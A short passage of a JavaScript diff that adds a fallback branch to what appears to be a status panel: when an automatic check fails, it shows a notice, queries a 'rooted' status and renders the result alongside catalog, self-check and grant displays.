+    rootSet('rootAutoNote','The automatic check could not run.','bad');rootStamp('rootAutoStamp','');
+    const q=await rootCall('rooted');
+    if(q&&q.rooted)rootRenderRooted(q.rooted);
+    return;
+  }
+
   if(r.catalog&&r.catalog.ok){ROOT=r.catalog;rootRender();}
   if(r.selfcheck)rootSelfCheck(r.selfcheck);
   rootGrants(r.grants||[]);
